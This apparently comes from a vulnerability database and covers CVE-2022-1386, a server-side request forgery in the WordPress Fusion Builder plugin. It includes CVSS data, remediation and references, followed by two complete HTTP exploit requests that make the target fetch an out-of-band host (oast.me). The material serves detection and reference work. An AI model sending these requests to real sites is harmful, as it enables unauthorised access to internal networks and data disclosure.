---
layout: "post"
cve_id: "CVE-2022-1386"
title: "WordPress Fusion Builder <3.6.2 - Server-Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-1386.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1386.yaml"
author: "akincibor,MantisSTS,calumjelrick"
severity: "critical"
impact: "An attacker can exploit this vulnerability to make requests to internal resources, potentially leading to unauthorized access or information disclosure.
"
remediation: "Update to the latest version of WordPress Fusion Builder plugin (3.6.2) or apply the vendor-provided patch.
"
reference:
  - "https://wpscan.com/vulnerability/bf7034ab-24c4-461f-a709-3f73988b536b"
  - "https://www.rootshellsecurity.net/rootshell-discovered-a-critical-vulnerability-in-top-wordpress-theme/"
  - "https://theme-fusion.com/version-7-6-2-security-update/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-1386"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2022-1386', 'cwe-id': 'CWE-918', 'epss-score': 0.9361, 'epss-percentile': 0.99824, 'cpe': 'cpe:2.3:a:fusion_builder_project:fusion_builder:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'fusion_builder_project', 'product': 'fusion_builder', 'framework': 'wordpress'}"
tags:
  - "cve"
  - "cve2022"
  - "wpscan"
  - "wordpress"
  - "ssrf"
  - "themefusion"
  - "wp"
  - "fusion"
  - "avada"
  - "intrusive"
  - "theme-fusion"
  - "fusion_builder_project"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WordPress Fusion Builder plugin before 3.6.2 is susceptible to server-side request forgery. The plugin does not validate a parameter in its forms, which can be used to initiate arbitrary HTTP requests. The data returned is then reflected back in the application's response. An attacker can potentially interact with hosts on the server's local network, bypass firewalls, and access control measures.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Content-Length: 30
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.victim.com
Referer: /
Accept-Encoding: gzip

action=fusion_form_update_view
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Content-Length: 1384
Content-Type: multipart/form-data; boundary=---------------------------30259827232283860776499538268
Origin: http://www.victim.com
Referer: /
Accept-Encoding: gzip

-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="formData"

email=example%40oast.me&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&priva
cy_expiration_action=ignore&fusion-form-nonce-0=g84tNz&fusion-fields-hold-private-data=
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="action"

fusion_form_submit_form_to_url
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusion_form_nonce"

g84tNz
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="form_id"

0
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="post_id"

0
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="field_labels"

{"email":"Email address"}
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="hidden_field_names"

[]
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusionAction"

https://oast.me
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusionActionMethod"

GET
-----------------------------30259827232283860776499538268--
```

